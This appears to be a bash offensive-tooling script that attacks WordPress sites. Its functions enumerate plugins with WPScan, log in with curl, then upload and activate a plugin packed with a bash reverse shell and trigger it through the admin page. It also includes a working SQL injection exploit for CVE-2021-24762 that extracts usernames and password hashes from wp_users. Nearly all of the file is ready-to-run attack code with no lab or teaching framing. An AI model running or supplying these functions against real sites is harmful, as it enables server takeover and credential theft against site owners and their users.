#!/bin/bash

run_wpscan() {
    local url="$1"
    if [[ -z "$url" ]]; then
        echo "Usage: run_wpscan <url>"
        return 1
    fi
    local wpscan_log="${url}_wpscan.log"
    if [[ ! -z "$log_dir" ]]; then
        wpscan_log="$log_dir/$wpscan_log"
    fi
    if [[ -f "$wpscan_log" ]]; then
        echo "WPScan output already exists, skipping scan."
        return
    fi
    local proxy_command=""
    if [[ ! -z $use_proxychain ]] && [[ $use_proxychain == "true" ]]; then
        proxy_command="proxychains -q "
        echo "Using proxychains for WPScan."
    fi
    echo "Running WPScan..."
    eval ${proxy_command}wpscan --url http://$url --enumerate p --plugins-detection aggressive | tee >(remove_color_to_log >> $wpscan_log)
}

login_wp() {
    if [[ -z "$target_hostname" ]]; then
        echo "Target hostname is not set. Using ip"
        target_hostname=$ip
    fi
    if [[ -z "$cookie_jar" ]]; then
        cookie_jar="wp-cookie.txt"
    fi    
    curl -s -c $cookie_jar "http://$target_hostname/wp-login.php" > /dev/null
    if [[ -z "$target_username" ]] || [[ -z "$target_password" ]]; then
        echo "Target username or password needs to be set"
        return 1
    fi
    echo "Logging in to WordPress at http://$target_hostname/wp-login.php"
    curl -s -b $cookie_jar -c $cookie_jar -d "log=$target_username" -d "pwd=$target_password" \
        -d "wp-submit=Log+In" -d "redirect_to=http://$target_hostname/wp-admin/" -d "testcookie=1" \
        http://$target_hostname/wp-login.php
    
}

upload_plugin() {
    echo "Start pf uploading plugin..."
    if [[ -z "$cookie_jar" ]]; then
        echo "Cookie jar is not set. Please login first"
        return 1
    fi
    if [[ -z "$plugin_name" ]]; then
        echo "Plugin name is not set. Please create a plugin first"
        return 1
    fi
    if [[ ! -f "$plugin_file" ]]; then
        echo "Plugin file $plugin_file does not exist. Please create a plugin first"
        return 1
    else
        echo "Plugin file $plugin_file exists, proceeding with upload"
    fi
    if [[ -z "$target_hostname" ]]; then
        echo "Target hostname is not set. Using ip"
        target_hostname=$ip
    fi
    local plugin_page=""
    plugin_page=$(curl -s -b "$cookie_jar" -c "$cookie_jar" "http://$target_hostname/wp-admin/plugins.php" | grep "$plugin_name" )
    if [[ -z "$plugin_page" ]]; then
        echo "Plugin not found, uploading..."
        nonce=$(curl -s -b "$cookie_jar" -c "$cookie_jar" "http://$target_hostname/wp-admin/plugin-install.php?tab=upload"| grep -oP 'name="_wpnonce" value="\K[^"]+')
        echo "Nonce: $nonce"    
        curl -s -b "$cookie_jar" -c "$cookie_jar" -F "_wpnonce=$nonce" -F "_wp_http_referer=/wp-admin/plugin-install.php" -F "pluginzip=@$plugin_file" "http://$target_hostname/wp-admin/update.php?action=upload-plugin" 
    fi
    plugin_page=$(curl -s -b "$cookie_jar" -c "$cookie_jar" "http://$target_hostname/wp-admin/plugins.php" | grep "$plugin_name" )
    if [[ -z "$plugin_page" ]]; then
        echo "Plugin not found after upload."
        return 1
    fi
    deactivate=$(echo "$plugin_page" | grep "Deactivate" )
    if [[ ! -z "$deactivate" ]]; then
        echo "Plugin has already been activated."
    else
        echo "Plugin is not activated, activating now..."
        echo "$plugin_page" > plugin_page.txt
        activate_url=$(echo "$plugin_page" | grep -oP "<span class='activate'><a href=\"\K[^\"]+" | sed 's/\&amp;/\&/g')
        echo "Activate URL: $activate_url"
        curl -s -v --cookie $cookie_jar "http://$target_hostname/wp-admin/$activate_url"
    fi

    plugin_page=$(curl -s --cookie $cookie_jar "http://$target_hostname/wp-admin/plugins.php" | grep "$plugin_name" )
    deactivate=$(echo "$plugin_page" | grep "Deactivate" )
    if [[ -z "$deactivate" ]]; then
        echo "Plugin is not activated, activation failed."
        echo "$plugin_page" > plugin_page.txt
        echo "$deactivate" > deactivate.txt
        return 1
    fi

}

create_wp_plugin_reverse_shell() {
    plugin_name="reverse-shell-plugin"
    mkdir -p $PWD/$plugin_name
    cp "$SCRIPTDIR/../php/wp-$plugin_name.php" $plugin_name/$plugin_name.php
    if [[ -z $cmd ]]; then
        cmd=$(get_bash_reverse_shell)
    fi
    cmd=$(echo "$cmd" | sed -E 's/"/\\"/g')        
    cmd=$(escape_sed "$cmd")
    sed -E -i "s/\{cmd\}/$cmd/g" $plugin_name/$plugin_name.php
    plugin_file="$plugin_name.zip"
    zip -r $plugin_file $plugin_name
}

run_wp_plugin_reverse_shell() {
    if [[ -z "$target_hostname" ]]; then
        echo "Target hostname is not set. Using ip"
        target_hostname=$ip
    fi
    if [[ -z "$cookie_jar" ]]; then
        echo "Cookie jar is not set. Please login first"
        return 1
    fi
    if [[ -z "$plugin_name" ]]; then
        echo "Plugin name is not set. Please create a plugin first"
        return 1
    fi
    local shell_url="http://$target_hostname/wp-admin/admin.php?page=$plugin_name"
    echo "Running reverse shell at $shell_url"
    local plugin_page=""
    plugin_page=$(curl -s -b "$cookie_jar" "$shell_url")
    if [[ -z "$plugin_page" ]]; then
        echo "Plugin page is empty. Plugin may not be activated or not uploaded correctly."
        return 1
    fi
    echo "$plugin_page" | awk '/<pre>/,/<\/pre>/'
}

#CVE 2021 24762
#https://wpscan.com/vulnerability/c1620905-7c31-4e62-80f5-1d9635be11ad/
run_perfect_survey_exploit() {
    local target_host="$1"
    if [[ -z "$target_host" ]]; then
        echo "Usage: run_perfect_survey_exploit <target_host>"
        return 1
    fi
    poc="wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2Cuser_pass%2C0%2C0%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users"
    url="http://$target_host/$poc"
    curl -s "$url" | sed 's/\\"/"/g' | sed 's/\\\//\//g' | grep -oP 'value="\K[^"]+' 

}